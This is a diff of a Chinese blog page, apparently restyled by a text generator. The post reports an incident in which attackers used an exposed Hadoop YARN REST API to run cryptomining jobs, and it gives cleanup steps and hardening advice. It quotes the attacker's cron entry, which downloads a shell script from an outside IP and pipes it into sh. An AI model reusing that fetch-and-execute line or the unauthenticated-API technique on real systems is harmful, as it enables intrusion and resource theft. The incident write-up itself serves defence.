@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -9,50 +9,57 @@
 <style>
 body {
   font-family: sans-serif;
-  background-color: #fff;
-  color: #333;
+  margin: 0;
+  padding: 0;
+  background-color: #000; /* Unix 风格 */
+  color: #eee;
+  text-align: center;
   max-width: 820px;
   margin: 0 auto;
-  padding: 20px;
-  box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
-  transition: background-color 0.5s ease;
 }
 
 h1 {
   font-size: 20px;
+  margin: 1em 0;
 }
 
 h2 {
   font-size: 18px;
+  margin: 1em 0;
 }
 
 h3 {
   font-size: 16px;
+  margin: 1em 0;
 }
 
 h4 {
   font-size: 14px;
+  margin: 1em 0;
 }
 
 h5 {
   font-size: 12px;
+  margin: 1em 0;
 }
 
 h6 {
   font-size: 11px;
+  margin: 1em 0;
 }
 
-code {
-  background-color: #f0f0f0;
-  padding: 2px 5px;
-  border-radius: 3px;
+p {
+  line-height: 1.5;
+  margin: 1em 0;
 }
 
-pre {
-  background-color: #f0f0f0;
-  padding: 10px;
-  border-radius: 5px;
-  overflow-x: auto;
+a {
+  color: #00f;
+  text-decoration: none;
+}
+
+a:hover {
+  text-decoration: underline;
 }
 
 img {
@@ -60,76 +67,131 @@ img {
   height: auto;
 }
 
-.title, .description, .keywords {
-  text-align: center;
+pre {
+  background-color: #222;
+  padding: 10px;
+  border-radius: 5px;
+  overflow-x: auto;
 }
 
-.night-mode {
-  background-color: #222;
+code {
+  font-family: monospace;
+  background-color: #333;
+  color: #eee;
+  padding: 2px 4px;
+  border-radius: 3px;
+}
+
+.highlight {
+  background-color: #333;
   color: #eee;
 }
+
+footer {
+  text-align: center;
+  margin-top: 2em;
+  font-size: 12px;
+  color: #ccc;
+}
+
+.container {
+  padding: 20px;
+  background-color: #fff; /* 添加白色背景 */
+  box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+  border-radius: 8px;
+  margin: 20px auto;
+}
+
+.title {
+  text-align: center;
+  margin-bottom: 20px;
+}
 </style>
-<script src="https://cdn.jsdelivr.net/npm/highlight.js@11.7.0/es/highlight.min.js"></script>
-<script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/prism.min.js"></script>
-<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@11.7.0/es/styles/default.min.css">
-<script>
-  hljs.initHighlightingOnLoad();
-  Prism.highlightAll();
-
-  const isNightMode = () => {
-    const hour = new Date().getHours();
-    return hour >= 19 || hour < 6;
-  };
-
-  if (isNightMode()) {
-    document.body.classList.add("night-mode");
-  }
-</script>
 </head>
 <body>
+<script>
+  // 随机数种子
+  const seed = 4538978253;
+
+  // 生成随机数
+  function random(max) {
+    let a = seed;
+    a = (a * 16807) % 2147483647;
+    return a % max;
+  }
+
+  // 获取当前时间
+  const now = new Date();
+  const hour = now.getHours();
+
+  // 设置主题颜色
+  if (hour >= 6 && hour < 18) {
+    // 白天模式
+    document.body.style.backgroundColor = "#fff";
+    document.body.style.color = "#333";
+    document.body.style.textShadow = "0 0 2px #eee";
+  } else {
+    // 夜间模式
+    document.body.style.backgroundColor = "#000";
+    document.body.style.color = "#eee";
+    document.body.style.textShadow = "0 0 2px #333";
+  }
+
+  // 代码高亮
+  const codeElements = document.querySelectorAll('pre code');
+  codeElements.forEach(code => {
+    code.classList.add('highlight');
+  });
+
+  // 随机背景
+  const backgrounds = [
+    '#f0f0f0', // 淡灰色
+    '#e0e0e0', // 灰色
+    '#d0d0d0', // 深灰色
+    '#c0c0c0', // 更深的灰色
+    '#b0b0b0', // 最深的灰色
+  ];
+  document.body.style.backgroundColor = backgrounds[random(backgrounds.length)];
+</script>
+<div class="container">
 <div class="title">
-  <h1>yarn运莫名其妙的job 导致集群变慢 一直在跑一个用户为dr.who的application</h1>
-</div>
-<div class="description">
-  <p>hadoop mapreduce 任务 莫名其妙的变多了 yarn被黑问题。</p>
-</div>
-<div class="keywords">
-  <p>hadoop</p>
+<h1>yarn运莫名其妙的job 导致集群变慢 一直在跑一个用户为dr.who的application</h1>
 </div>
 
 <p>简单介绍一下过程，现在有些人通过 hadoop 开放的restApi进行挖矿，8088 以及 8090 端口。</p>
 
-<h3>排问题</h3>
-<ul>
-<li>1 . 集群 检查</li>
-</ul>
+<h2>排问题</h2>
+
+<h3>1 . 集群 检查</h3>
 <p>今天检查Hadoop 服务器发现Yarn上面的job莫名其妙的变多了，而且一直再跑。</p>
 <img src="http://112firshme11224.test.upcdn.net/demos/7422da30-8014-41f6-a922-55f86a3ce252.png" alt="截图">
 <p>经过排查在`/tmp/ /var/tmp` 下面发现了 Java 还有tmp.txt</p>
 <p>内容如下：</p>
 <img src="http://112firshme11224.test.upcdn.net/demos/63c45ec8-bcbd-4fbd-98bb-ee624eb4ea70.png" alt="截图">
 <p>服务器地址:`transfer.sh`</p>
-<ul>
-<li>2. 检查  <code>crontab -l  </code> 发现了一个莫名其妙的 job</li>
-</ul>
+
+<h3>2. 检查  `crontab -l  ` 发现了一个莫名其妙的 job</h3>
+
 <pre><code>* * * * * wget -q -O - http://185.222.210.59/cr.sh | sh > /dev/null 2>&1
 </code></pre>
 
-<h3>解决办法</h3>
-<ul>
-<li>1，通过查看占用cpu高得进程，kill掉此进程</li>
-<li>2，检查/tmp和/var/tmp目录，删除java、ppc、w.conf等异常文件</li>
-<li>3 ，通过crontab -l 查看有一个<code>* * * * * wget -q -O - http://185.222.210.59/cr.sh | sh > /dev/null 2>&1</code>任务，删除此任务</li>
-<li>4，排查YARN日志，确认异常的application，删除处理</li>
-<li>5 再通过top验证看是否还有高cpu进程，如果有，kill掉，没有的话应该正常了。</li>
-<li>6 注意：YARN提供有默认开放在8088和8090的REST API（默认前者）允许用户直接通过API进行相关的应用创建、任务提交执行等操作，如果配置不当，REST API将会开放在公网导致未授权访问的问题，那么任何黑客则就均可利用其进行远程命令执行，从而进行挖矿等行为，黑客直接利用开放在8088的REST API提交执行命令，来实现在服务器内下载执行.sh脚本，从而再进一步下载启动挖矿程序达到挖矿的目的，因此注意并启用Kerberos认证功能，禁止匿名访问修改8088端口</li>
-</ul>
+<h2>解决办法</h2>
+
+<ol>
+<li>通过查看占用cpu高得进程，kill掉此进程</li>
+<li>检查/tmp和/var/tmp目录，删除java、ppc、w.conf等异常文件</li>
+<li>通过crontab -l 查看有一个* * * * * wget -q -O - http://185.222.210.59/cr.sh | sh > /dev/null 2>&1任务，删除此任务</li>
+<li>排查YARN日志，确认异常的application，删除处理</li>
+<li>再通过top验证看是否还有高cpu进程，如果有，kill掉，没有的话应该正常了。</li>
+<li>注意：YARN提供有默认开放在8088和8090的REST API（默认前者）允许用户直接通过API进行相关的应用创建、任务提交执行等操作，如果配置不当，REST API将会开放在公网导致未授权访问的问题，那么任何黑客则就均可利用其进行远程命令执行，从而进行挖矿等行为，黑客直接利用开放在8088的REST API提交执行命令，来实现在服务器内下载执行.sh脚本，从而再进一步下载启动挖矿程序达到挖矿的目的，因此注意并启用Kerberos认证功能，禁止匿名访问修改8088端口</li>
+</ol>
 
 <h4>感谢老铁登科</h4>
 <p>转载请注明出处，本文采用 <a href="http://creativecommons.org/licenses/by-nc-nd/4.0/">CC4.0</a> 协议授权</p>
 
+</div>
 <footer>
-  <p>Power By Gemini TextGenerate 2024-09-16</p>
+Power By Gemini TextGenerate 2024-09-16 21:33:17
 </footer>
 </body>
 </html>
